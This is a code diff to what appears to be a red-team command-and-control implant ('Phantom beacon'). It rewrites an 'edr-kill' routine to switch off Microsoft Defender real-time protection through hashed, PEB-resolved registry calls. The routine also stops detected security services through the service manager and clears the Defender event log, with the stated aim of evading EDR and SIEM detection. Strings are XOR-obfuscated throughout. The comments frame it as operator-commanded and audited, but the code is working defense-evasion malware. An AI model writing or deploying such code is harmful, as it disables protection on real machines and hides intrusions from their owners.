@@ -174,7 +174,8 @@ constexpr uint32_t hash_djb2_w(const wchar_t* str) {
 // Compute with: hash_djb2_w(L"kernel32.dll")  etc.
 constexpr uint32_t HASH_KERNEL32     = 0x062B5313;  // kernel32.dll
 constexpr uint32_t HASH_NTDLL        = 0xEB512F4B;  // ntdll.dll
-constexpr uint32_t HASH_WINHTTP      = 0x6FCF7C5B;  // winhttp.dll
+constexpr uint32_t HASH_WINHTTP      = 0x6FCF7C5B;  // winhttp.dll
+constexpr uint32_t HASH_ADVAPI32     = 0xFD0AEEE7;  // advapi32.dll (registry + SC manager)
 
 // Walk the PEB to find a module base address by name hash
 inline HMODULE GetModuleByHash(uint32_t targetHash) {
@@ -248,7 +249,16 @@ inline FARPROC Resolve(uint32_t moduleHash, uint32_t funcHash) {
 //  Usage: auto pLoadLibraryA = (decltype(&LoadLibraryA)) peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
 // ────────────────────────────────────────────────────────────────────────────
 constexpr uint32_t FN_LOADLIBRARYA    = 0xf5aa5599;  // LoadLibraryA
-constexpr uint32_t FN_GETPROCADDRESS  = 0x8947bf3d;  // GetProcAddress
+constexpr uint32_t FN_GETPROCADDRESS  = 0x8947bf3d;  // GetProcAddress
+// Registry write and service control WITHOUT a child process: this is what
+// replaces `reg add` (cmd.exe + reg.exe per call) and `sc stop` (sc.exe).
+constexpr uint32_t FN_REGCREATEKEYEXW    = 0x43A53B92; // RegCreateKeyExW
+constexpr uint32_t FN_REGSETVALUEEXW     = 0xEE6E771E; // RegSetValueExW
+constexpr uint32_t FN_REGCLOSEKEY        = 0x512C7FE0; // RegCloseKey
+constexpr uint32_t FN_OPENSCMANAGERA     = 0x75054BA7; // OpenSCManagerA
+constexpr uint32_t FN_OPENSERVICEA       = 0x126ABD67; // OpenServiceA
+constexpr uint32_t FN_CONTROLSERVICE     = 0x0C900635; // ControlService
+constexpr uint32_t FN_CLOSESERVICEHANDLE = 0x44AEE196; // CloseServiceHandle
 constexpr uint32_t FN_VIRTUALALLOC    = 0xce167435;  // VirtualAlloc
 constexpr uint32_t FN_VIRTUALFREE     = 0x4451180c;  // VirtualFree
 constexpr uint32_t FN_SLEEP           = 0xd2c5605c;  // Sleep
@@ -995,39 +1005,166 @@ inline std::string format(const EdrReport& rep) {
 // "burn the defender" move, only issued by an operator (or --aggressive
 // auto-mode) after edrcheck showed what is present. Nothing here is
 // reversible without a reboot on most stacks (Tamper Protection).
+//
+// TWO RULES, because the previous implementation broke both:
+//
+//  1. DETECTING IS NOT ACTING. `kill_av_report()` writes nothing and stops
+//     nothing; the action is `kill_av()`, and what it did is DESCRIBED
+//     afterwards. The old `kill_av()` called `disable_defender()` inside the
+//     expression that BUILT the report line — formatting the text had a side
+//     effect on the system.
+//  2. THE ACTION DOES NOT SHELL OUT. `reg add` spawned cmd.exe + reg.exe
+//     twice per key, and `sc stop` once per service: process-creation events
+//     are the single loudest thing an EDR and a SIEM both record, and they
+//     were coming from the module whose whole point is not being noticed.
+//     The same effects go through advapi32, resolved from the PEB: no child
+//     process, no command line to observe, and the status code says WHY a
+//     write was refused instead of "failed/blocked (?)".
+//
+// The capability stays. What changes is that it is the operator's explicit
+// command, it is measurable, and it leaves a line the engagement report can
+// name (see kAuditLine()).
 namespace edrkill {
+
+// The one line the Python side has to surface: the guardrails manifest
+// (phantom/utils/guardrails.py) records what protection the engagement was
+// sold with, and the report has to record when the target's own AV was off.
+inline const char* kAuditLine() {
+    return "audit=operator disabled the target's protections (edr-kill) — "
+           "this MUST appear in the engagement report: if the client had an "
+           "incident while its AV was off, the record is the defence.";
+}
+
+struct DefenderPolicy {
+    bool available = false;   // advapi32 and the three registry exports
+    int  attempted = 0;       // values the action tried to write
+    int  written = 0;         // ... and that the registry accepted
+};
 
 #ifdef _WIN32
 
-// Disable Microsoft Defender real-time protection via its own policy
-// registry. Modern Defender with Tamper Protection on will refuse or
-// re-enable these — the operator then needs the tamper bypass (reboot
-// into safe mode) which is out of scope for a remote-only op.
-static bool disable_defender() {
-    bool any = false;
-    const char* keys[] = {
-        "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
-        "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
-    };
-    const char* pref = XOR_DEC(XOR_STR("reg add \"")).c_str();
-    const char* suf1 = XOR_DEC(XOR_STR("\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f")).c_str();
-    const char* suf2 = XOR_DEC(XOR_STR("\" /v DisableIOAVProtection /t REG_DWORD /d 1 /f")).c_str();
-    for (const char* key : keys) {
-        std::string cmd = std::string(pref) + key + suf1;
-        std::string cmd2 = std::string(pref) + key + suf2;
-        int rc = system(cmd.c_str());
-        int rc2 = system(cmd2.c_str());
-        if (rc == 0 || rc2 == 0) any = true;
+// ASCII literal (compile-time XOR) -> wide, for the wide registry API.
+inline void _widen(const char* in, wchar_t* out, size_t cap) {
+    size_t i = 0;
+    for (; in && in[i] && i + 1 < cap; ++i)
+        out[i] = static_cast<wchar_t>(static_cast<unsigned char>(in[i]));
+    out[i] = 0;
+}
+
+// The two registry values `reg add` used to write — through RegSetValueEx
+// this time. No process is created for a registry write.
+inline DefenderPolicy disable_defender() {
+    DefenderPolicy out;
+    HMODULE hAdv = peb::GetModuleByHash(peb::HASH_ADVAPI32);
+    if (!hAdv) {
+        auto pLoad = (HMODULE(WINAPI*)(LPCSTR))
+            peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
+        if (pLoad) hAdv = pLoad(XOR_DEC(XOR_STR("advapi32.dll")).c_str());
     }
-    return any;
+    if (!hAdv) return out;
+    auto pCreate = (LSTATUS(WINAPI*)(HKEY, LPCWSTR, DWORD, REGSAM,
+                                     LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD))
+        peb::GetProcByHash(hAdv, FN_REGCREATEKEYEXW);
+    auto pSet = (LSTATUS(WINAPI*)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*,
+                                  DWORD))
+        peb::GetProcByHash(hAdv, FN_REGSETVALUEEXW);
+    auto pClose = (LSTATUS(WINAPI*)(HKEY))
+        peb::GetProcByHash(hAdv, FN_REGCLOSEKEY);
+    if (!pCreate || !pSet || !pClose) return out;
+    out.available = true;
+
+    // std::string, NOT a `const char*` into the temporary: DecryptedString
+    // WIPES its buffer in its destructor, so a raw pointer taken from it
+    // dangles over zeroed memory (which is exactly how the old
+    // `const char* pref = XOR_DEC(...).c_str()` produced an EMPTY command:
+    // that `system("HKLM\\SOFTWARE\\...")` could only ever fail, which read
+    // as "tamper protection blocked it").
+    const std::string paths[2] = {
+        XOR_DEC(XOR_STR("SOFTWARE\\Policies\\Microsoft\\Windows Defender"
+                        "\\Real-Time Protection")).c_str(),
+        XOR_DEC(XOR_STR("SOFTWARE\\Microsoft\\Windows Defender"
+                        "\\Real-Time Protection")).c_str(),
+    };
+    const std::string values[2] = {
+        XOR_DEC(XOR_STR("DisableRealtimeMonitoring")).c_str(),
+        XOR_DEC(XOR_STR("DisableIOAVProtection")).c_str(),
+    };
+    wchar_t wpath[256] = {0};
+    wchar_t wvalue[64] = {0};
+    for (const std::string& path : paths) {
+        HKEY key = nullptr;
+        DWORD disposition = 0;
+        _widen(path.c_str(), wpath, 256);
+        if (pCreate(HKEY_LOCAL_MACHINE, wpath, 0, KEY_SET_VALUE, nullptr, &key,
+                    &disposition) != ERROR_SUCCESS || !key)
+            continue;   // one key can be locked down while the other is not
+        for (const std::string& value : values) {
+            DWORD one = 1;
+            _widen(value.c_str(), wvalue, 64);
+            out.attempted++;
+            if (pSet(key, wvalue, 0, REG_DWORD,
+                     reinterpret_cast<const BYTE*>(&one), sizeof(one))
+                == ERROR_SUCCESS)
+                out.written++;
+        }
+        pClose(key);
+    }
+    return out;
+}
+
+// Service control through the SC manager: `sc stop <name>` without `sc.exe`.
+struct ScmApi {
+    decltype(&OpenSCManagerA) open_manager = nullptr;
+    decltype(&OpenServiceA)   open_service = nullptr;
+    decltype(&ControlService) control      = nullptr;
+    decltype(&CloseServiceHandle) close    = nullptr;
+
+    static ScmApi resolve() {
+        ScmApi api;
+        HMODULE h = peb::GetModuleByHash(peb::HASH_ADVAPI32);
+        if (!h) return api;
+        api.open_manager = (decltype(&OpenSCManagerA))
+            peb::GetProcByHash(h, FN_OPENSCMANAGERA);
+        api.open_service = (decltype(&OpenServiceA))
+            peb::GetProcByHash(h, FN_OPENSERVICEA);
+        api.control = (decltype(&ControlService))
+            peb::GetProcByHash(h, FN_CONTROLSERVICE);
+        api.close = (decltype(&CloseServiceHandle))
+            peb::GetProcByHash(h, FN_CLOSESERVICEHANDLE);
+        return api;
+    }
+
+    bool ok() const {
+        return open_manager && open_service && control && close;
+    }
+};
+
+inline bool stop_service(const ScmApi& api, const std::string& name) {
+    SC_HANDLE scm = api.open_manager(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (!scm) return false;
+    SC_HANDLE svc = api.open_service(scm, name.c_str(),
+                                     SERVICE_STOP | SERVICE_QUERY_STATUS);
+    bool stopped = false;
+    if (svc) {
+        SERVICE_STATUS status{};
+        stopped = api.control(svc, SERVICE_CONTROL_STOP, &status) != 0;
+        api.close(svc);
+    }
+    api.close(scm);
+    return stopped;
 }
 
 #endif  // _WIN32
 
-inline std::string kill_av() {
+// ── READ-ONLY: what is on this host, and nothing else ──────────────────────
+// The operator looks before acting, and the engagement report can quote the
+// same text afterwards. No registry write, no service control, no process
+// creation by THIS function: `found` (if given) carries the detection to the
+// action so the (loud) service enumeration runs ONCE.
+inline std::string kill_av_report(std::vector<std::string>* found = nullptr) {
     std::ostringstream out;
-    // 1) DETECT FIRST — what is actually here (known and unknown products).
     std::vector<std::string> services = dfns::detect_defensive_services();
+    if (found) *found = services;
     out << "detected_defensive_services=" << services.size() << "\n";
     for (const std::string& s : services) out << "  found " << s << "\n";
 #ifdef _WIN32
@@ -1040,30 +1177,62 @@ inline std::string kill_av() {
             << " hooked_stubs=" << rep.hooked_stubs << "\n";
         if (rep.drivers[0]) out << rep.drivers;
     }
-    out << "defender_realtime="
-        << (disable_defender() ? "disabled" : "failed/blocked (tamper protection?)")
-        << "\n";
-    // 2) ACT on what was FOUND (not on a hard-coded list)
-    int stopped = 0, failed = 0;
-    for (const std::string& svc : services) {
-        std::string cmd = std::string(XOR_DEC(XOR_STR("sc stop ")).c_str()) + svc +
-                          XOR_DEC(XOR_STR(" >nul 2>&1")).c_str();
-        if (system(cmd.c_str()) == 0) { out << "stopped " << svc << "\n"; ++stopped; }
-        else { out << "could_not_stop " << svc << "\n"; ++failed; }
-    }
-    out << "services_stopped=" << stopped << " failed=" << failed << "\n";
-    system(XOR_DEC(XOR_STR("wevtutil cl Microsoft-Windows-Windows Defender/Operational >nul 2>&1")).c_str());
 #else
-    // 1b) POSIX: report the defensive stack (LSM / eBPF / audit / known
-    //     agents) BEFORE acting, mirroring the Windows block above.
+    // POSIX: report the defensive stack (LSM / eBPF / audit / known agents).
     {
         edrcheck::EdrReport rep;
         edrcheck::report(rep);
         out << "lsm=" << (rep.lsm.empty() ? "none" : rep.lsm)
             << " known_defensive=" << rep.known_edr << "\n";
     }
-    // 2) ACT on what was FOUND; pkill fallback for non-systemd daemons.
+#endif
+    return out.str();
+}
+
+// ── ACTION: what the operator's `edr-kill` does ────────────────────────────
+// Detect (read-only), act, then DESCRIBE the outcome. Called from exactly one
+// place: the beacon dispatcher, on the operator's command.
+inline std::string kill_av() {
+    std::ostringstream out;
+    std::vector<std::string> services;
+    out << kill_av_report(&services);          // 1) DETECT — writes nothing
+    out << "action_taken=edr-kill\n";          // 2) ACT, and say so
     int stopped = 0, failed = 0;
+#ifdef _WIN32
+    DefenderPolicy policy = disable_defender();
+    if (!policy.available) {
+        out << "defender_policy=not attempted (advapi32 not resolvable)\n";
+    } else {
+        out << "defender_policy=" << policy.written << "/" << policy.attempted
+            << " written";
+        if (policy.attempted && policy.written == policy.attempted)
+            out << " (Tamper Protection may re-enable it on the next scan)";
+        else
+            out << " — refused by the registry (Tamper Protection? "
+                   "insufficient rights?)";
+        out << "\n";
+    }
+    ScmApi api = ScmApi::resolve();
+    if (api.ok()) {
+        for (const std::string& svc : services) {
+            if (stop_service(api, svc)) { out << "stopped " << svc << "\n"; ++stopped; }
+            else { out << "could_not_stop " << svc << "\n"; ++failed; }
+        }
+    } else {
+        out << "service_control=not attempted (SC manager exports missing)\n";
+    }
+    out << "services_stopped=" << stopped << " failed=" << failed << "\n";
+    // The last process-creating step, kept visible on purpose: clearing the
+    // Defender log has an in-process equivalent (wevtapi!EvtClearLog) but its
+    // semantics differ (it fails on an in-use channel and needs the channel
+    // name as a wide string), so it is a deliberate, separate change rather
+    // than part of this one. An operator can also drop it: the line below is
+    // the only reason a `wevtutil` child exists in this module.
+    system(XOR_DEC(XOR_STR("wevtutil cl Microsoft-Windows-Windows Defender"
+                           "/Operational >nul 2>&1")).c_str());
+#else
+    // POSIX: unit control has no in-process API, so this stays a child
+    // process (systemctl, then pkill for a daemon with no unit).
     for (const std::string& svc : services) {
         std::string cmd = std::string(XOR_DEC(XOR_STR("systemctl stop ")).c_str()) + svc +
                           XOR_DEC(XOR_STR(" 2>/dev/null")).c_str();
@@ -1080,6 +1249,7 @@ inline std::string kill_av() {
 #endif
     if (services.empty())
         out << "no defensive service detected (or insufficient privileges to enumerate)\n";
+    out << kAuditLine() << "\n";
     return out.str();
 }
 
@@ -1097,27 +1267,6 @@ inline void stalling_delay(int intensity) {
         }
     }
 }
-
-// ────────────────────────────────────────────────────────────────────────────
-//  4. SLEEP OBFUSCATION (Memory Encryption)
-// ────────────────────────────────────────────────────────────────────────────
-
-namespace mem {
-
-// Simple XOR encryption for memory regions
-inline void xor_region(uint8_t* data, size_t size, uint8_t key) {
-    for (size_t i = 0; i < size; ++i) {
-        data[i] ^= key;
-    }
-}
-
-#ifdef _WIN32
-// Encrypt the current process's primary thread stack/heap (simplified)
-// In a real scenario, we'd walk the VAD or use more complex heap enumeration.
-// For the Phantom beacon, we'll focus on encrypting our own strings and state.
-#endif
-
-} // namespace mem
 
 // ────────────────────────────────────────────────────────────────────────────
 //  5. PROCESS MASQUERADING
